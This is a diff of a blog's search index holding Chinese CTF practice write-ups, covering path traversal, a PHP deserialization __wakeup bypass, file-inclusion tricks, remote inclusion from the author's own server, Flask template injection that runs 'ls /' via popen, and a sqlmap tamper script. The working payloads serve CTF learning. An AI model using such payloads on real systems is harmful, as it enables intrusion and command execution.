@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>PHP源码分析(二):disable_function处理机制</title>
-    <url>/2020/02/26/PHP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%BA%8C-disable-function%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/</url>
+    <title>PHP源码分析(一):disable_function处理机制</title>
+    <url>/2020/02/26/PHP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%B8%80-disable-function%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<h2 id="入口函数"><a href="#入口函数" class="headerlink" title="入口函数"></a>入口函数</h2><p>入口函数在<code>main/main.c</code>的<code>php_disable_functions()</code></p>
 <a id="more"></a>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> void php_disable_functions(void)</span><br><span class="line">&#123;</span><br><span class="line">	char *s = <span class="keyword">NULL</span>, *e;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!*(INI_STR(<span class="string">"disable_functions"</span>))) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	e = PG(disable_functions) = strdup(INI_STR(<span class="string">"disable_functions"</span>));</span><br><span class="line">	<span class="keyword">if</span> (e == <span class="keyword">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (*e) &#123;</span><br><span class="line">		<span class="keyword">switch</span> (*e) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">			<span class="keyword">case</span> <span class="string">','</span>:</span><br><span class="line">				<span class="keyword">if</span> (s) &#123;</span><br><span class="line">					*e = <span class="string">'\0'</span>;</span><br><span class="line">					zend_disable_function(s, e-s);</span><br><span class="line">					s = <span class="keyword">NULL</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">if</span> (!s) &#123;</span><br><span class="line">					s = e;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		e++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (s) &#123;</span><br><span class="line">		zend_disable_function(s, e-s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -447,6 +447,37 @@
       <tags>
         <tag>WCTF</tag>
         <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人练习WP Week 8 B</title>
+    <url>/2019/07/08/Week-8-B/</url>
+    <content><![CDATA[<h1 id="Week-8-B-Mc-Donald"><a href="#Week-8-B-Mc-Donald" class="headerlink" title="Week 8 B Mc Donald"></a>Week 8 B Mc Donald</h1><h3 id="触发原因-ds-store"><a href="#触发原因-ds-store" class="headerlink" title="触发原因 ds_store"></a>触发原因 ds_store</h3><p><img src="https://live.staticflickr.com/65535/48238119351_a5b86ce903_o.png" alt></p>
+<p><img src="https://live.staticflickr.com/65535/48238119681_1281bd95d3_o.png" alt></p>
+<p>Flag <code>35c3_Appl3s_H1dden_F1l3s</code></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人练习WP Week 8 A</title>
+    <url>/2019/07/08/Week-8-A/</url>
+    <content><![CDATA[<h1 id="MyWeek-8-A-Not-e-accessible"><a href="#MyWeek-8-A-Not-e-accessible" class="headerlink" title="MyWeek 8 A Not(e) accessible"></a>MyWeek 8 A <a href="http://35.207.132.47:90/" target="_blank" rel="noopener">Not(e) accessible</a></h1><h3 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h3><p>提交笔记</p>
+<p><img src="https://live.staticflickr.com/65535/48231935746_64d45ec976_o.png" alt></p>
+<p><code>http://35.207.132.47:90/view.php?id=-6242905976685918977&amp;pw=47bce5c74f589f4867dbd57e9ca9f808</code></p>
+<p>随便改改</p>
+<p><img src="https://live.staticflickr.com/65535/48232010247_e9f2c9acf6_o.png" alt></p>
+<p>考虑任意文件读取</p>
+<p>构造payload </p>
+<p><code>http://35.207.132.47:90/view.php?id=-6242905976685918977/../../admin&amp;pw=47bce5c74f589f4867dbd57e9ca9f808</code></p>
+<p>flag</p>
+<p><code>35C3_M1Cr0_S3rvices_4R3_FUN!</code></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+        <tag>Note</tag>
       </tags>
   </entry>
   <entry>
@@ -978,18 +1009,21 @@
       </tags>
   </entry>
   <entry>
-    <title>个人练习WP Week 8 A</title>
-    <url>/2019/07/08/Week-8-A/</url>
-    <content><![CDATA[<h1 id="MyWeek-8-A-Not-e-accessible"><a href="#MyWeek-8-A-Not-e-accessible" class="headerlink" title="MyWeek 8 A Not(e) accessible"></a>MyWeek 8 A <a href="http://35.207.132.47:90/" target="_blank" rel="noopener">Not(e) accessible</a></h1><h3 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h3><p>提交笔记</p>
-<p><img src="https://live.staticflickr.com/65535/48231935746_64d45ec976_o.png" alt></p>
-<p><code>http://35.207.132.47:90/view.php?id=-6242905976685918977&amp;pw=47bce5c74f589f4867dbd57e9ca9f808</code></p>
-<p>随便改改</p>
-<p><img src="https://live.staticflickr.com/65535/48232010247_e9f2c9acf6_o.png" alt></p>
-<p>考虑任意文件读取</p>
-<p>构造payload </p>
-<p><code>http://35.207.132.47:90/view.php?id=-6242905976685918977/../../admin&amp;pw=47bce5c74f589f4867dbd57e9ca9f808</code></p>
-<p>flag</p>
-<p><code>35C3_M1Cr0_S3rvices_4R3_FUN!</code></p>
+    <title>个人练习WP Week 8 C</title>
+    <url>/2019/07/08/Week-8-C/</url>
+    <content><![CDATA[<h1 id="Week-8-C-wakeup函数绕过"><a href="#Week-8-C-wakeup函数绕过" class="headerlink" title="Week 8 C __wakeup函数绕过"></a>Week 8 C __wakeup函数绕过</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line">	<span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	$flag=<span class="string">'12345'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;flag) == <span class="keyword">$this</span>-&gt;flag[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"flag&#123;1231212&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$str = unserialize($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure>
+<p>这里我们怎么绕过呢？</p>
+<h4 id="Puzzle-One"><a href="#Puzzle-One" class="headerlink" title="Puzzle One"></a>Puzzle One</h4><p>​    我们要绕过<code>__wakeup()</code>给flag赋值的问题</p>
+<h4 id="Puzzle-Two"><a href="#Puzzle-Two" class="headerlink" title="Puzzle Two"></a>Puzzle Two</h4><p>​    我们要绕过<code>md5(a) == a[0]</code>的问题</p>
+<p>这里我们对Puzzle One需要了解一个cve</p>
+<p><img src="http://pic.c1imber.top/blog/181031/J0bm2IaaCc.png?imageslim" alt="img"></p>
+<p>如果我们构造</p>
+<p><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></p>
+<p>我们就可以绕过此函数</p>
+<p>第二我们随便找个md5是其首字母位0，md5为0e开头</p>
+<p><code>0ec92f8847011379ce0c1c95d3d52677 0aaaga</code></p>
+<p>Payload</p>
+<p><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;0aaaga&quot;;}</code></p>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
@@ -997,11 +1031,38 @@
       </tags>
   </entry>
   <entry>
-    <title>个人练习WP Week 8 B</title>
-    <url>/2019/07/08/Week-8-B/</url>
-    <content><![CDATA[<h1 id="Week-8-B-Mc-Donald"><a href="#Week-8-B-Mc-Donald" class="headerlink" title="Week 8 B Mc Donald"></a>Week 8 B Mc Donald</h1><h3 id="触发原因-ds-store"><a href="#触发原因-ds-store" class="headerlink" title="触发原因 ds_store"></a>触发原因 ds_store</h3><p><img src="https://live.staticflickr.com/65535/48238119351_a5b86ce903_o.png" alt></p>
-<p><img src="https://live.staticflickr.com/65535/48238119681_1281bd95d3_o.png" alt></p>
-<p>Flag <code>35c3_Appl3s_H1dden_F1l3s</code></p>
+    <title>个人练习WP Week 4 0</title>
+    <url>/2019/07/08/Week4-0/</url>
+    <content><![CDATA[<h1 id="0"><a href="#0" class="headerlink" title="0"></a>0</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>@hctf-2018-warmup</p>
+<p>这道题不算做这周，这只是我想讲讲几个方法，和误区。</p>
+<p><img src="https://live.staticflickr.com/65535/48231800071_0624c993da_o.png" alt></p>
+<p>然后看源码</p>
+<p><img src="https://live.staticflickr.com/65535/48231801711_4810b3c77c_o.png" alt></p>
+<p>发现<code>source.php</code> 以及一个文件包含。</p>
+<p>hint.php</p>
+<p><img src="https://live.staticflickr.com/65535/48231874581_5766eab8a8_o.png" alt></p>
+<p>Source.php</p>
+<p><img src="https://live.staticflickr.com/65535/48231801471_58e52d8eeb_o.png" alt></p>
+<p>这是题目的具体情况。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="Method-1⃣️"><a href="#Method-1⃣️" class="headerlink" title="Method 1⃣️"></a>Method 1⃣️</h3><p>说在前面，写CTF题不能被题目所给的条件所局限。</p>
+<p>我们不妨直接访问<code>ffffllllaaaagggg</code></p>
+<p><img src="https://live.staticflickr.com/65535/48231875457_5bcbd057df_o.png" alt></p>
+<h3 id="Method-2⃣️"><a href="#Method-2⃣️" class="headerlink" title="Method 2⃣️"></a>Method 2⃣️</h3><p>说在后面，练习CTF时不妨多想想方法，这样就可以更好提高。</p>
+<p>我们开始代码审计。</p>
+<p> 考察</p>
+<p><img src="https://live.staticflickr.com/65535/48231803896_8c028fa298_o.png" alt></p>
+<p>其中看到</p>
+<p><img src="https://live.staticflickr.com/65535/48231804011_9bbc070863_o.png" alt></p>
+<p>这个是用来判断文件名是不是白名单。如果不是</p>
+<p><img src="https://live.staticflickr.com/65535/48231878062_8e0478b54a_o.png" alt></p>
+<p>这个是干什么呢？类似于<code>flag.php?a=1</code>这种，提取<code>？</code>之前的字符</p>
+<p><img src="https://live.staticflickr.com/65535/48231805226_17f1c9a018_o.png" alt></p>
+<p>之后就是如果OK，就include。</p>
+<p>如何绕过？不妨构造<code>hint.php?/../ffffllllaaaagggg</code></p>
+<p>既可以绕过判断，也可读取文件。</p>
+<p>现在解释下如何读取文件</p>
+<p>编译器会认为<code>hint.php?</code>是一个目录， <code>../</code>就退回到上一级目录，便是当前目录，读取 <code>ffffllllaaaagggg</code>得到flag</p>
+<p><img src="https://live.staticflickr.com/65535/48231805591_dd4c73a1de_o.png" alt></p>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
@@ -1045,28 +1106,6 @@
 <p>反弹shell</p>
 <p>在服务器上接收。</p>
 <p>然后之前实验的都OK，做writeup不知道服务器是挂了还是啥。</p>
-]]></content>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>个人练习WP Week 8 C</title>
-    <url>/2019/07/08/Week-8-C/</url>
-    <content><![CDATA[<h1 id="Week-8-C-wakeup函数绕过"><a href="#Week-8-C-wakeup函数绕过" class="headerlink" title="Week 8 C __wakeup函数绕过"></a>Week 8 C __wakeup函数绕过</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line">	<span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	$flag=<span class="string">'12345'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;flag) == <span class="keyword">$this</span>-&gt;flag[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"flag&#123;1231212&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$str = unserialize($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure>
-<p>这里我们怎么绕过呢？</p>
-<h4 id="Puzzle-One"><a href="#Puzzle-One" class="headerlink" title="Puzzle One"></a>Puzzle One</h4><p>​    我们要绕过<code>__wakeup()</code>给flag赋值的问题</p>
-<h4 id="Puzzle-Two"><a href="#Puzzle-Two" class="headerlink" title="Puzzle Two"></a>Puzzle Two</h4><p>​    我们要绕过<code>md5(a) == a[0]</code>的问题</p>
-<p>这里我们对Puzzle One需要了解一个cve</p>
-<p><img src="http://pic.c1imber.top/blog/181031/J0bm2IaaCc.png?imageslim" alt="img"></p>
-<p>如果我们构造</p>
-<p><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></p>
-<p>我们就可以绕过此函数</p>
-<p>第二我们随便找个md5是其首字母位0，md5为0e开头</p>
-<p><code>0ec92f8847011379ce0c1c95d3d52677 0aaaga</code></p>
-<p>Payload</p>
-<p><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;0aaaga&quot;;}</code></p>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
@@ -1126,45 +1165,6 @@
       </tags>
   </entry>
   <entry>
-    <title>个人练习WP Week 4 0</title>
-    <url>/2019/07/08/Week4-0/</url>
-    <content><![CDATA[<h1 id="0"><a href="#0" class="headerlink" title="0"></a>0</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>@hctf-2018-warmup</p>
-<p>这道题不算做这周，这只是我想讲讲几个方法，和误区。</p>
-<p><img src="https://live.staticflickr.com/65535/48231800071_0624c993da_o.png" alt></p>
-<p>然后看源码</p>
-<p><img src="https://live.staticflickr.com/65535/48231801711_4810b3c77c_o.png" alt></p>
-<p>发现<code>source.php</code> 以及一个文件包含。</p>
-<p>hint.php</p>
-<p><img src="https://live.staticflickr.com/65535/48231874581_5766eab8a8_o.png" alt></p>
-<p>Source.php</p>
-<p><img src="https://live.staticflickr.com/65535/48231801471_58e52d8eeb_o.png" alt></p>
-<p>这是题目的具体情况。</p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="Method-1⃣️"><a href="#Method-1⃣️" class="headerlink" title="Method 1⃣️"></a>Method 1⃣️</h3><p>说在前面，写CTF题不能被题目所给的条件所局限。</p>
-<p>我们不妨直接访问<code>ffffllllaaaagggg</code></p>
-<p><img src="https://live.staticflickr.com/65535/48231875457_5bcbd057df_o.png" alt></p>
-<h3 id="Method-2⃣️"><a href="#Method-2⃣️" class="headerlink" title="Method 2⃣️"></a>Method 2⃣️</h3><p>说在后面，练习CTF时不妨多想想方法，这样就可以更好提高。</p>
-<p>我们开始代码审计。</p>
-<p> 考察</p>
-<p><img src="https://live.staticflickr.com/65535/48231803896_8c028fa298_o.png" alt></p>
-<p>其中看到</p>
-<p><img src="https://live.staticflickr.com/65535/48231804011_9bbc070863_o.png" alt></p>
-<p>这个是用来判断文件名是不是白名单。如果不是</p>
-<p><img src="https://live.staticflickr.com/65535/48231878062_8e0478b54a_o.png" alt></p>
-<p>这个是干什么呢？类似于<code>flag.php?a=1</code>这种，提取<code>？</code>之前的字符</p>
-<p><img src="https://live.staticflickr.com/65535/48231805226_17f1c9a018_o.png" alt></p>
-<p>之后就是如果OK，就include。</p>
-<p>如何绕过？不妨构造<code>hint.php?/../ffffllllaaaagggg</code></p>
-<p>既可以绕过判断，也可读取文件。</p>
-<p>现在解释下如何读取文件</p>
-<p>编译器会认为<code>hint.php?</code>是一个目录， <code>../</code>就退回到上一级目录，便是当前目录，读取 <code>ffffllllaaaagggg</code>得到flag</p>
-<p><img src="https://live.staticflickr.com/65535/48231805591_dd4c73a1de_o.png" alt></p>
-]]></content>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>个人练习WP Week 4 A</title>
     <url>/2019/07/08/Week4-A/</url>
     <content><![CDATA[<h1 id="A"><a href="#A" class="headerlink" title="A"></a>A</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>hctf-2018 kzone</p>
@@ -1192,6 +1192,92 @@
 <p><img src="https://live.staticflickr.com/65535/48238118056_3fc431456b_o.png" alt></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    sub = <span class="string">""</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">"--"</span>, <span class="string">"#"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> payload:</span><br><span class="line">        sub += <span class="string">'\u00'</span>+str(hex(ord(key)))[<span class="number">2</span>:]</span><br><span class="line">    sub = sub.replace(<span class="string">" "</span>, <span class="string">"/**/"</span>)</span><br><span class="line">    sub = <span class="string">"""&#123;"admin_user":"admin"""</span>+sub+<span class="string">"""","admin_pass":65&#125;"""</span></span><br><span class="line">    <span class="keyword">return</span> sub</span><br></pre></td></tr></table></figure>
 <p>这样也行</p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人练习WP Week 4 C</title>
+    <url>/2019/07/08/Week4-C/</url>
+    <content><![CDATA[<h1 id="Week4-C"><a href="#Week4-C" class="headerlink" title="Week4 C"></a>Week4 C</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>NCTF 2018 <a href="http://ctfgame.acdxvfsvd.net:20007/" target="_blank" rel="noopener">easy_audit</a></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>访问网站</p>
+<p><img src="https://live.staticflickr.com/65535/48232017527_e8c72896b1_o.png" alt></p>
+<h4 id="第一次绕过"><a href="#第一次绕过" class="headerlink" title="第一次绕过"></a>第一次绕过</h4><p>这里过滤了几个问题一个<code>$_REQUEST</code>不能有字母，一个<code>$_SERVER</code>不能有关键字。</p>
+<p>这是开始的两个绕过</p>
+<p>针对第一个问题，不妨考虑变量覆盖，我们知道$_REQUEST可以接受COOKIE，POST的消息，我们不妨使用POST覆盖GET消息。</p>
+<p>我们了解到$_SERVER不会对字符串解析，比如%27不会解析成<code>‘</code>我们可以利用这点绕过。</p>
+<h4 id="第二次绕过"><a href="#第二次绕过" class="headerlink" title="第二次绕过"></a>第二次绕过</h4><p>针对md5我们不妨传入数组，便可以绕过</p>
+<p>针对nctf的请求我们可以构造<code>anctfisfun</code>便可以绕过。</p>
+<p>下面就是flag</p>
+<p>因为我们使用了POST进行变量覆盖，我们便不能使用<code>php://input</code>进行绕过</p>
+<p>我们有两种方法解决</p>
+<ul>
+<li><p>将POST覆盖改为COOKIE覆盖（我没实验成功）</p>
+</li>
+<li><p>使用http协议从外部获取</p>
+</li>
+</ul>
+<p>因此我们可以在服务器上新建个网页</p>
+<p><code>&lt;?php echo &quot;ccc_liubi&quot;;?&gt;</code></p>
+<p>为什么要这么写呢？</p>
+<p>主要是如果直接是文本会产生一个换行符。然后匹配不上</p>
+<p><code>http://122.152.230.160/a.php</code></p>
+<p><img src="https://live.staticflickr.com/65535/48237056402_e4559e34d2_o.png" alt></p>
+<p><img src="https://live.staticflickr.com/65535/48237056607_103551299b_o.png" alt></p>
+<p><code>nctf{he1he1he1_l3ts_g0}</code></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人练习WP Week 5 A（模版注入）</title>
+    <url>/2019/07/08/Week5-A/</url>
+    <content><![CDATA[<h1 id="模版注入专题（沙箱绕过）Flask"><a href="#模版注入专题（沙箱绕过）Flask" class="headerlink" title="模版注入专题（沙箱绕过）Flask"></a>模版注入专题（沙箱绕过）Flask</h1><p>以NCTF flask 为例</p>
+<h2 id="先前说明"><a href="#先前说明" class="headerlink" title="先前说明"></a>先前说明</h2><p>我们在python的object类中集成了很多的基础函数，我们这里的最主要考虑就是想办法得到object。</p>
+<h3 id="获得object"><a href="#获得object" class="headerlink" title="获得object"></a>获得object</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure>
+<p>之后通过<code>__subclasses__</code>里的相关类可以参考利用</p>
+<p>在flask我们可以从</p>
+<ul>
+<li><code>config</code>, the current configuration object</li>
+<li><code>request</code>, the current request object</li>
+<li><code>session</code>, the current session object</li>
+<li><code>g</code>, the request-bound object for global variables. This is usually used by the developer to store resources during a request.</li>
+</ul>
+<p>这几个角度开始入手</p>
+<h3 id="后续利用"><a href="#后续利用" class="headerlink" title="后续利用"></a>后续利用</h3><ul>
+<li>request</li>
+<li>Config</li>
+<li>ftplib</li>
+<li>httplib</li>
+<li>file</li>
+<li>os._wrap_close.popen</li>
+</ul>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>http://127.0.0.1:19008/2</code></p>
+<p><img src="https://live.staticflickr.com/65535/48236974081_fc322c21d2_o.png" alt></p>
+<p>考虑模版注入</p>
+<p>通过burp检测过滤关键字</p>
+<p><img src="https://live.staticflickr.com/65535/48237059267_3673a6e857_o.png" alt></p>
+<p>config class mro args request open eval builtins import</p>
+<p>这些词语被过滤</p>
+<p>我们怎么操作呢。</p>
+<h3 id="第一步我们怎么获得object呢？"><a href="#第一步我们怎么获得object呢？" class="headerlink" title="第一步我们怎么获得object呢？"></a>第一步我们怎么获得object呢？</h3><p><img src="https://live.staticflickr.com/65535/48237060152_3e720f71c2_o.png" alt></p>
+<p>在flask模版中我们有以上两个等价。</p>
+<p>因此我们可以通过字符拼接绕过</p>
+<p><code>&quot;&quot;[&quot;__cl&quot;+&quot;ass__&quot;].__base__</code> == <code>&quot;&quot;.__class__.__base__</code> == <code>object</code></p>
+<p>这里还有一种方法<code>|attr(&quot;&quot;)</code></p>
+<p>通过此我们便可以得到object类</p>
+<h3 id="获得可以利用的类"><a href="#获得可以利用的类" class="headerlink" title="获得可以利用的类"></a>获得可以利用的类</h3><p>通过<code>object.__subclasses__()</code>我们可以看到</p>
+<p><img src="https://live.staticflickr.com/65535/48236975411_c991a2a21d_o.png" alt></p>
+<p>这其中都是我们可以利用的类。</p>
+<p>搜索上述关键字，我们可以找到popen</p>
+<p>通过构造</p>
+<p><code>http://127.0.0.1:19008/%7B%7B&#39;&#39;[&quot;__c&quot;+&quot;lass__&quot;][&quot;__m&quot;+&quot;ro__&quot;][1][&quot;__subcl&quot;+&quot;asses__&quot;]()[20].__init__.__globals__[&quot;pop&quot;+&quot;en&quot;](&quot;ls%20/&quot;).read()%7D%7D</code></p>
+<p>我们可以得到</p>
+<p><img src="https://live.staticflickr.com/65535/48236974536_32c6b6c872_o.png" alt></p>
 ]]></content>
       <tags>
         <tag>Writeup</tag>
@@ -1334,92 +1420,6 @@
       </tags>
   </entry>
   <entry>
-    <title>个人练习WP Week 4 C</title>
-    <url>/2019/07/08/Week4-C/</url>
-    <content><![CDATA[<h1 id="Week4-C"><a href="#Week4-C" class="headerlink" title="Week4 C"></a>Week4 C</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>NCTF 2018 <a href="http://ctfgame.acdxvfsvd.net:20007/" target="_blank" rel="noopener">easy_audit</a></p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>访问网站</p>
-<p><img src="https://live.staticflickr.com/65535/48232017527_e8c72896b1_o.png" alt></p>
-<h4 id="第一次绕过"><a href="#第一次绕过" class="headerlink" title="第一次绕过"></a>第一次绕过</h4><p>这里过滤了几个问题一个<code>$_REQUEST</code>不能有字母，一个<code>$_SERVER</code>不能有关键字。</p>
-<p>这是开始的两个绕过</p>
-<p>针对第一个问题，不妨考虑变量覆盖，我们知道$_REQUEST可以接受COOKIE，POST的消息，我们不妨使用POST覆盖GET消息。</p>
-<p>我们了解到$_SERVER不会对字符串解析，比如%27不会解析成<code>‘</code>我们可以利用这点绕过。</p>
-<h4 id="第二次绕过"><a href="#第二次绕过" class="headerlink" title="第二次绕过"></a>第二次绕过</h4><p>针对md5我们不妨传入数组，便可以绕过</p>
-<p>针对nctf的请求我们可以构造<code>anctfisfun</code>便可以绕过。</p>
-<p>下面就是flag</p>
-<p>因为我们使用了POST进行变量覆盖，我们便不能使用<code>php://input</code>进行绕过</p>
-<p>我们有两种方法解决</p>
-<ul>
-<li><p>将POST覆盖改为COOKIE覆盖（我没实验成功）</p>
-</li>
-<li><p>使用http协议从外部获取</p>
-</li>
-</ul>
-<p>因此我们可以在服务器上新建个网页</p>
-<p><code>&lt;?php echo &quot;ccc_liubi&quot;;?&gt;</code></p>
-<p>为什么要这么写呢？</p>
-<p>主要是如果直接是文本会产生一个换行符。然后匹配不上</p>
-<p><code>http://122.152.230.160/a.php</code></p>
-<p><img src="https://live.staticflickr.com/65535/48237056402_e4559e34d2_o.png" alt></p>
-<p><img src="https://live.staticflickr.com/65535/48237056607_103551299b_o.png" alt></p>
-<p><code>nctf{he1he1he1_l3ts_g0}</code></p>
-]]></content>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>个人练习WP Week 5 A（模版注入）</title>
-    <url>/2019/07/08/Week5-A/</url>
-    <content><![CDATA[<h1 id="模版注入专题（沙箱绕过）Flask"><a href="#模版注入专题（沙箱绕过）Flask" class="headerlink" title="模版注入专题（沙箱绕过）Flask"></a>模版注入专题（沙箱绕过）Flask</h1><p>以NCTF flask 为例</p>
-<h2 id="先前说明"><a href="#先前说明" class="headerlink" title="先前说明"></a>先前说明</h2><p>我们在python的object类中集成了很多的基础函数，我们这里的最主要考虑就是想办法得到object。</p>
-<h3 id="获得object"><a href="#获得object" class="headerlink" title="获得object"></a>获得object</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure>
-<p>之后通过<code>__subclasses__</code>里的相关类可以参考利用</p>
-<p>在flask我们可以从</p>
-<ul>
-<li><code>config</code>, the current configuration object</li>
-<li><code>request</code>, the current request object</li>
-<li><code>session</code>, the current session object</li>
-<li><code>g</code>, the request-bound object for global variables. This is usually used by the developer to store resources during a request.</li>
-</ul>
-<p>这几个角度开始入手</p>
-<h3 id="后续利用"><a href="#后续利用" class="headerlink" title="后续利用"></a>后续利用</h3><ul>
-<li>request</li>
-<li>Config</li>
-<li>ftplib</li>
-<li>httplib</li>
-<li>file</li>
-<li>os._wrap_close.popen</li>
-</ul>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>http://127.0.0.1:19008/2</code></p>
-<p><img src="https://live.staticflickr.com/65535/48236974081_fc322c21d2_o.png" alt></p>
-<p>考虑模版注入</p>
-<p>通过burp检测过滤关键字</p>
-<p><img src="https://live.staticflickr.com/65535/48237059267_3673a6e857_o.png" alt></p>
-<p>config class mro args request open eval builtins import</p>
-<p>这些词语被过滤</p>
-<p>我们怎么操作呢。</p>
-<h3 id="第一步我们怎么获得object呢？"><a href="#第一步我们怎么获得object呢？" class="headerlink" title="第一步我们怎么获得object呢？"></a>第一步我们怎么获得object呢？</h3><p><img src="https://live.staticflickr.com/65535/48237060152_3e720f71c2_o.png" alt></p>
-<p>在flask模版中我们有以上两个等价。</p>
-<p>因此我们可以通过字符拼接绕过</p>
-<p><code>&quot;&quot;[&quot;__cl&quot;+&quot;ass__&quot;].__base__</code> == <code>&quot;&quot;.__class__.__base__</code> == <code>object</code></p>
-<p>这里还有一种方法<code>|attr(&quot;&quot;)</code></p>
